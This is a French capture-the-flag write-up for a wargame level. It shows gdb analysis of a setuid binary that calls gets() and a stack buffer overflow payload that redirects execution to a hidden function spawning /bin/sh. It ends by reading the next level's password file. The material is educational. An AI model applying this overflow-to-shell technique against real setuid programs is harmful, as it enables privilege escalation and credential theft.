## Comportement
- J'ai des droits `level1` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1*`
En exécutant le binaire (`./level1`), on observe:
- qu'il attend un input de notre part.
- qu'il exit juste après notre input.
- qu'il segfault `Segmentation fault (core dumped)` si l'input est trop long.

→ Peut-être un segfault à exploiter ?


## Analyse
En analysant le binaire (`gdb ./level1`) on observe:
- La fonction appelle "gets" qui n'est pas sécurisé en cas de buffer overrun (voir `man gets`).
  ```shell
  (gdb) disas main
  ...
  0x08048490 <+16>:	call   0x8048340 <gets@plt>
  ...
  ```
- Il existe une fonction `run()` qui n'est pas appelé dans `main()` : 
  ```shell
  (gdb) i functions
  ...
  0x08048444  run
  0x08048480  main
  ...
  ```
- Dans la fonction `run()` il y a un appel système : 
  ```shell
  (gdb) disas run
  ...
  0x08048472 <+46>:	movl   $0x8048584,(%esp) # argument envoyé a la fonction system() en dessous
  0x08048479 <+53>:	call   0x8048360 <system@plt>
  ...
  ```
- Il suffit d'examiner l'adresse du paramètre envoyé a la fonction `system()` 
(situe une ligne au dessus) pour constater qu'on execute `/bin/sh`. 
Ce qui est une technique courante pour lancer un shell interactif. 
  ```shell
  (gdb) x/s 0x8048584
  0x8048584:	 "/bin/sh"
  ```


## Résolution
- Il faut trouver l'offset de l'`eip` (le pointeur du jeu d'instruction en cours) pour savoir de 
combien il faut overflow le buffer. Dans `main()` on a vu que le buffer est de 80 bytes. 
(`0x08048486 <+6>:		sub    esp,0x50`). On obtient bien un segfault : 
```shell
$ python -c 'print "A" * 80' | ./level1
Segmentation fault (core dumped)
```
- Maintenant il faut gérer le padding, c'est a dire soustraire suffisamment de bytes pour placer l'adresse 
de la fonction `run()` (`0x08048444`) que l'on veut insérer. Elle prend 4 bytes. On obtient encore un 
segfault, cette fois ce n'est pas normal car `run()` aurait du être appelé. 
```shell
$ python -c 'print "A" * 76 + "\x08\x04\x84\x44"' | ./level1
Segmentation fault (core dumped)
```
- En regardant bien la stack, on voit que l'adresse est inscrite en little endian, il faut donc l'inverser.
La fonction `run()` ets bien appelé ! On le voit grace au print "Good... Wait what?" mais ou est le shell ? 
```shell
$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```
- Le shell a bien ete ouvert mais il exit car son process parent exit. Il existe un moyen de laisser stdin open (en utilisant `- |`). On va donc inscrire le payload dans un fichier, puis faire un `cat` de ce fichier en utilisant notre trick : 
```shell
python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
cat /tmp/payload - | ./level1
Good... Wait what?
```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level2`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/user/level2/.pass`)
  - quitter le shell (`exit`)
  - et passer au level2 (`su level2`) en renseignant ce password.
